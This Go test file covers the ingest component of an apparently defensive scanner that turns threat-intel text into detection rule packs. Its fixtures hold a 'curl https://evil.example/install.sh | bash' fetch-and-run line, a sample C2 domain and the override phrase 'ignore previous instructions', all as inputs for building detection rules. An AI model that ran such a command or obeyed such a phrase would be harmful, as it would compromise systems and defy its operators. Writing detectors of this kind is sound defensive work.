package ingest

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/TGPSKI/skeptic/internal/model"
)

func testWriteFixture(t *testing.T, root string, relPath string, content string) {
	t.Helper()
	path := filepath.Join(root, relPath)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("mkdir failed for %s: %v", relPath, err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write fixture %s: %v", relPath, err)
	}
}

func TestReadSourcesFile(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "sources.txt")
	body := "# comment\n\nhttps://example.com/a\nlocal-file.md\n"
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatalf("write sources file: %v", err)
	}

	sources, err := ReadSourcesFile(path)
	if err != nil {
		t.Fatalf("ReadSourcesFile failed: %v", err)
	}
	if len(sources) != 2 {
		t.Fatalf("expected two parsed sources, got %v", sources)
	}
}

func TestReadURLSource(t *testing.T) {
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("intel-content"))
	}))
	defer srv.Close()

	client := srv.Client()
	client.Timeout = 2 * time.Second
	parsed, err := url.Parse(srv.URL)
	if err != nil {
		t.Fatalf("parse test server URL: %v", err)
	}
	allowed := map[string]struct{}{parsed.Hostname(): {}}

	content, err := ReadURLSource(context.Background(), client, srv.URL, 1024, false, allowed)
	if err != nil {
		t.Fatalf("ReadURLSource failed: %v", err)
	}
	if !strings.Contains(content, "intel-content") {
		t.Fatalf("unexpected URL content: %q", content)
	}
}

func TestReadURLSourceHostAndStatusValidation(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusTeapot)
	}))
	defer srv.Close()
	client := &http.Client{Timeout: 2 * time.Second}
	parsed, _ := url.Parse(srv.URL)

	if _, err := ReadURLSource(context.Background(), client, srv.URL, 1024, true, map[string]struct{}{"other.example": {}}); err == nil {
		t.Fatalf("expected disallowed host to fail")
	}
	if _, err := ReadURLSource(context.Background(), client, srv.URL, 1024, true, map[string]struct{}{parsed.Hostname(): {}}); err == nil {
		t.Fatalf("expected non-2xx HTTP status to fail")
	}
}

func TestReadDirectorySourceAndLocalFileLimit(t *testing.T) {
	root := t.TempDir()
	testWriteFixture(t, root, "a.md", "malicious IOC here")
	testWriteFixture(t, root, "b.txt", "second")
	testWriteFixture(t, root, "node_modules/skip.md", "should skip repo skip dir")
	testWriteFixture(t, root, "blob.bin", "\x00\x01\x02")

	docs, warnings := ReadDirectorySource(root, 1024, 1)
	if len(warnings) > 0 {
		t.Logf("directory warnings: %v", warnings)
	}
	if len(docs) != 1 {
		t.Fatalf("expected max-files limit of 1, got %d", len(docs))
	}

	_, err := ReadLocalFileLimited(filepath.Join(root, "blob.bin"), 1024)
	if err == nil {
		t.Fatalf("expected binary file read to fail")
	}
}

func TestLoadSourceDocuments(t *testing.T) {
	root := t.TempDir()
	filePath := filepath.Join(root, "intel.md")
	if err := os.WriteFile(filePath, []byte("malicious ioc"), 0o644); err != nil {
		t.Fatalf("write source file: %v", err)
	}
	dirPath := filepath.Join(root, "intel-dir")
	if err := os.MkdirAll(dirPath, 0o755); err != nil {
		t.Fatalf("mkdir source dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dirPath, "doc.txt"), []byte("indicator"), 0o644); err != nil {
		t.Fatalf("write dir source: %v", err)
	}

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("remote-intel"))
	}))
	defer srv.Close()
	parsed, _ := url.Parse(srv.URL)

	docs, warnings, err := LoadSourceDocuments(context.Background(), []string{
		filePath,
		dirPath,
		srv.URL,
		filepath.Join(root, "missing.txt"),
	}, SourceLoadOptions{
		MaxSourceBytes: 1024,
		MaxFilesPerDir: 10,
		Timeout:        2 * time.Second,
		AllowHTTP:      true,
		MaxRedirects:   2,
		AllowedHosts:   []string{parsed.Hostname()},
	})
	if err != nil {
		t.Fatalf("LoadSourceDocuments failed: %v", err)
	}
	if len(docs) < 3 {
		t.Fatalf("expected file+dir+url docs, got %d", len(docs))
	}
	if len(warnings) == 0 {
		t.Fatalf("expected warning for missing source path")
	}
}

func TestIngestRuleBuilders(t *testing.T) {
	c := NewGeneratedRuleCollector(200, model.SeverityInfo)
	line := "malicious tool poisoning: uses actions/checkout@v4 package litellm==1.82.8 @scope/pkg module github.com/acme/mod v1.2.3 crate = \"1.2.3\" image ghcr.io/acme/app:1 mcp typosquat clawhub.ai/x/y ignore previous instructions"
	lower := strings.ToLower(line)
	risky := true

	AddGeneralIOCLineRules(c, "hash d2a0d5f564628773b6af7b9c11f6b86531a875bd2d186d7081ab62748a800ebb and 1.2.3.4", true, true, "src", 1)
	AddGitHubActionRules(c, line, risky)
	AddPyPIRules(c, line, lower, risky)
	AddNpmRules(c, line, lower, risky)
	AddGoRules(c, line, lower, risky)
	AddCargoRules(c, line, lower, risky)
	AddContainerRules(c, line, lower, risky)
	AddMcpRules(c, line, lower, risky)
	AddAgentSkillRules(c, line, lower, risky)
	AddNpmRules(c, "hello world", "hello world", false)
	AddCargoRules(c, "hello world", "hello world", false)

	rules := c.Rules()
	if len(rules) == 0 {
		t.Fatalf("expected generated rules from helper builders")
	}
}

func TestAffectedPackageCSVAndExposureRules(t *testing.T) {
	csvBody := "package,notes,litellm_constraint\nrequests,x,>=1.82.7\nexamplepkg,y,\n"
	rows, ok := ParseAffectedPackagesCSV(csvBody)
	if !ok || len(rows) != 2 {
		t.Fatalf("expected parsed affected rows, got ok=%v rows=%v", ok, rows)
	}

	collector := NewGeneratedRuleCollector(20, model.SeverityInfo)
	AddAffectedPackageExposureRules(collector, rows)
	rules := collector.Rules()
	if len(rules) == 0 {
		t.Fatalf("expected dependency exposure rules")
	}
}

func TestIngestUtilityHelpers(t *testing.T) {
	if !IsLikelyTextByExt("a.yaml") || IsLikelyTextByExt("x.exe") {
		t.Fatalf("IsLikelyTextByExt classification mismatch")
	}

	lit := NewLiteralRule("ingested", "title", "T1059", model.SeverityHigh, " [.]evil.example ", true)
	if lit.Pattern == "" || !strings.Contains(lit.Pattern, "(?i)") {
		t.Fatalf("expected literal rule with case-insensitive pattern: %+v", lit)
	}
	if CleanIndicator(" [.]evil.example ") != "evil.example" {
		t.Fatalf("unexpected cleaned indicator")
	}
	if StripMarkup("<b>abc</b> &amp; &#39;") != "abc & '" {
		t.Fatalf("unexpected markup stripping output")
	}
	if !IsLikelyPackageName("requests") || IsLikelyPackageName("12") {
		t.Fatalf("IsLikelyPackageName mismatch")
	}

	keys := model.SortedMapKeys(map[string]struct{}{"b": {}, "a": {}})
	if len(keys) != 2 || keys[0] != "a" || keys[1] != "b" {
		t.Fatalf("unexpected sorted keys: %v", keys)
	}
	if len(DedupeStrings([]string{"a", " a ", "", "b"})) != 2 {
		t.Fatalf("DedupeStrings should trim and dedupe")
	}
}

func TestWriteRulePackAndSummarizeRuleSpecs(t *testing.T) {
	root := t.TempDir()
	out := filepath.Join(root, "rules", "pack.json")
	pack := model.RulePack{
		Version:     1,
		Name:        "x",
		GeneratedAt: time.Now().UTC().Format(time.RFC3339),
		Rules: []model.RuleSpec{
			{ID: "A", Severity: model.SeverityCritical, Pattern: "a", Target: model.TargetContent},
			{ID: "B", Severity: model.SeverityLow, Pattern: "b", Target: model.TargetContent},
		},
	}
	if err := WriteRulePack(out, pack); err != nil {
		t.Fatalf("WriteRulePack failed: %v", err)
	}
	summary := SummarizeRuleSpecs(pack.Rules)
	if summary[string(model.SeverityCritical)] != 1 || summary[string(model.SeverityLow)] != 1 {
		t.Fatalf("unexpected SummarizeRuleSpecs output: %v", summary)
	}
	if err := WriteRulePack(" ", pack); err == nil {
		t.Fatalf("expected empty output path to fail")
	}
}

func TestRunIngestValidation(t *testing.T) {
	var stdout, stderr strings.Builder
	code := RunIngest(context.Background(), []string{"--source", "x", "--max-rules", "0"}, &stdout, &stderr)
	if code != 2 {
		t.Fatalf("expected ingest invalid flag exit=2, got %d", code)
	}
}

func TestRunIngestInputFormatValidation(t *testing.T) {
	var stdout, stderr strings.Builder
	code := RunIngest(context.Background(), []string{"--source", "x", "--input-format", "xml"}, &stdout, &stderr)
	if code != 2 {
		t.Fatalf("expected ingest --input-format xml to exit 2, got %d", code)
	}
	if !strings.Contains(stderr.String(), "invalid --input-format") {
		t.Fatalf("expected input-format validation error, got %q", stderr.String())
	}

	stdout.Reset()
	stderr.Reset()
	for _, valid := range []string{"auto", "stix", "sigma", "yara"} {
		code = RunIngest(context.Background(), []string{"--source", "x", "--input-format", valid}, &stdout, &stderr)
		if code == 2 && strings.Contains(stderr.String(), "invalid --input-format") {
			t.Fatalf("valid --input-format %q rejected", valid)
		}
		stdout.Reset()
		stderr.Reset()
	}
}

func TestRunIngestGeneratesRulePackFromLocalSource(t *testing.T) {
	root := t.TempDir()
	sourcePath := filepath.Join(root, "intel.md")
	outPath := filepath.Join(root, "generated-rules.json")

	source := `
Critical update:
- malicious C2 domain: badc2.example
- IOC SHA256: d2a0d5f564628773b6af7b9c11f6b86531a875bd2d186d7081ab62748a800ebb
- pip compromise: litellm==1.82.8
- run curl https://evil.example/install.sh | bash
`
	if err := os.WriteFile(sourcePath, []byte(source), 0o644); err != nil {
		t.Fatalf("write source file failed: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	exitCode := RunIngest(context.Background(), []string{
		"--source", sourcePath,
		"--out", outPath,
		"--ecosystems", "general,pypi",
		"--min-severity", "medium",
		"--max-rules", "50",
	}, &stdout, &stderr)
	if exitCode != 0 {
		t.Fatalf("runIngest failed with exit code %d, stderr: %s", exitCode, stderr.String())
	}

	data, err := os.ReadFile(outPath)
	if err != nil {
		t.Fatalf("read generated rules failed: %v", err)
	}
	var pack model.RulePack
	if err := json.Unmarshal(data, &pack); err != nil {
		t.Fatalf("parse generated rule pack failed: %v", err)
	}
	if len(pack.Rules) == 0 {
		t.Fatalf("expected at least one generated rule")
	}

	joined := strings.ToLower(stdout.String())
	if !strings.Contains(joined, "generated rule pack") {
		t.Fatalf("expected ingest summary in stdout, got: %s", stdout.String())
	}
}

func TestReadURLSourceCancellation(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(2 * time.Second)
		_, _ = w.Write([]byte("delayed"))
	}))
	defer srv.Close()

	parsed, _ := url.Parse(srv.URL)
	allowed := map[string]struct{}{parsed.Hostname(): {}}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	_, err := ReadURLSource(ctx, srv.Client(), srv.URL, 1024, true, allowed)
	if err == nil {
		t.Fatal("expected canceled context to fail ReadURLSource")
	}
}
